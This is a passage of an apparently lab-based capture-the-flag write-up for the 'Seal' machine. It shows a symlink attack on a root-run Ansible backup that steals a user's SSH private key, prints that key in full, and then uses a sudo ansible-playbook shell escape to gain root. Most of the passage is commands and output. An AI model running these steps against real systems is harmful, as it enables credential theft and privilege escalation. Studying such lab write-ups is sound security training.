+<p>We can abuse this by creating a symlink to a sensative file owned by luis, such as his ssh private key. When the backup playbook runs it will copy the source of the symlink. Then we can unpack the backup and we should be able to access the private key as we have read permisons on the backed up directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis.id_rsa
+</code></pre></div></div>
+
+<p>Wait a miniute for the playbook cron to run, then check <code class="language-plaintext highlighter-rouge">/opt/backups/archives</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@seal:/opt/backups/archives<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/backups/archives/
+total 2384
+drwxrwxr-x 2 luis luis   4096 Dec 14 15:03 <span class="nb">.</span>
+drwxr-xr-x 4 luis luis   4096 Dec 14 15:03 ..
+<span class="nt">-rw-rw-r--</span> 1 luis luis 606047 Dec 14 15:00 backup-2021-12-14-15:00:32.gz
+<span class="nt">-rw-rw-r--</span> 1 luis luis 606047 Dec 14 15:01 backup-2021-12-14-15:01:33.gz
+<span class="nt">-rw-rw-r--</span> 1 luis luis 608926 Dec 14 15:02 backup-2021-12-14-15:02:33.gz
+<span class="nt">-rw-rw-r--</span> 1 luis luis 608926 Dec 14 15:03 backup-2021-12-14-15:03:32.gz
+</code></pre></div></div>
+
+<p>We find a backup that is bigger than the rest. We’ll copy and extract that, and check we got luis’s key.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@seal:/opt/backups/archives<span class="nv">$ </span><span class="nb">cp </span>backup-2021-12-14-15:03:32.gz /dev/shm/backup.gz<span class="p">;</span> <span class="nb">cd</span> /dev/shm
+tomcat@seal:/dev/shm<span class="nv">$ </span><span class="nb">gunzip</span> <span class="nt">-d</span> backup.gz
+tomcat@seal:/dev/shm<span class="nv">$ </span><span class="nb">ls
+</span>backup pspy64
+tomcat@seal:/dev/shm<span class="nv">$ </span>file backup
+backup: POSIX <span class="nb">tar </span>archive
+tomcat@seal:/dev/shm<span class="nv">$ </span><span class="nb">tar </span>xvf backup
+dashboard/
+dashboard/scripts/
+dashboard/images/
+dashboard/css/
+dashboard/uploads/
+dashboard/bootstrap/
+dashboard/index.html
+dashboard/scripts/flot/
+dashboard/scripts/datatables/
+dashboard/scripts/jquery-ui-1.10.1.custom.min.js
+dashboard/scripts/common.js
+dashboard/scripts/jquery-1.9.1.min.js
+dashboard/scripts/flot/jquery.flot.resize.js
+dashboard/scripts/flot/jquery.flot.pie.js
+dashboard/scripts/flot/jquery.flot.js
+dashboard/scripts/datatables/jquery.dataTables.js
+dashboard/images/jquery-ui/
+dashboard/images/icons/
+dashboard/images/img.jpg
+dashboard/images/user.png
+dashboard/images/bg.png
+dashboard/images/jquery-ui/picker.png
+dashboard/images/icons/css/
+dashboard/images/icons/font/
+dashboard/images/icons/css/font-awesome.css
+dashboard/images/icons/font/fontawesome-webfont3294.ttf
+dashboard/images/icons/font/fontawesome-webfontd41d.eot
+dashboard/images/icons/font/fontawesome-webfont3294.eot
+dashboard/images/icons/font/fontawesome-webfont3294.woff
+dashboard/css/theme.css
+dashboard/uploads/luis.id_rsa
+dashboard/bootstrap/css/
+dashboard/bootstrap/js/
+dashboard/bootstrap/img/
+dashboard/bootstrap/css/bootstrap-responsive.min.css
+dashboard/bootstrap/css/bootstrap.min.css
+dashboard/bootstrap/js/bootstrap.min.js
+dashboard/bootstrap/img/glyphicons-halflings.png
+dashboard/bootstrap/img/glyphicons-halflings-white.png
+tomcat@seal:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>dashboard/uploads/luis.id_rsa
+<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
+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
+<span class="nv">u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE</span><span class="o">=</span>
+<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>Copy the key to our attacking box, chmod 600 it then use it to login to ssh.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> luis.id_rsa luis@10.129.190.22
+
+The authenticity of host <span class="s1">'10.129.190.22 (10.129.190.22)'</span> cant be established.
+ED25519 key fingerprint is SHA256:CK0IgtHX4isQwWAPna6oD88DnRAM9OacxQExxLSnlL0.
+This key is not known by any other names
+Are you sure you want to <span class="k">continue </span>connecting <span class="o">(</span><span class="nb">yes</span>/no/[fingerprint]<span class="o">)</span>? <span class="nb">yes
+</span>Warning: Permanently added <span class="s1">'10.129.190.22'</span> <span class="o">(</span>ED25519<span class="o">)</span> to the list of known hosts.
+Welcome to Ubuntu 20.04.2 LTS <span class="o">(</span>GNU/Linux 5.4.0-80-generic x86_64<span class="o">)</span>
+..snip...
+Last login: Fri May  7 07:00:18 2021 from 10.10.14.2
+luis@seal:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p><img src="assets/seal_screenshots/user_txt.png" alt="user_txt" /></p>
+
+<h2 id="privesc-to-root">PrivEsc to root</h2>
+
+<p>Checking <code class="language-plaintext highlighter-rouge">sudo -l</code> shows luis can run ansible playbooks as root with no password.</p>
+
+<p><img src="assets/seal_screenshots/sudo_l.png" alt="sudo_l" /></p>
+
+<p>Checking <a href="https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo">gtfobins</a> shows how we can abuse this by creating an ansible palybook that sends us a reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="s1">'[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]'</span> <span class="o">&gt;</span><span class="nv">$TF</span>
+<span class="nb">sudo </span>ansible-playbook <span class="nv">$TF</span>
+</code></pre></div></div>
+
+<p><img src="assets/seal_screenshots/root_txt.png" alt="root_txt" /></p>
+:ET
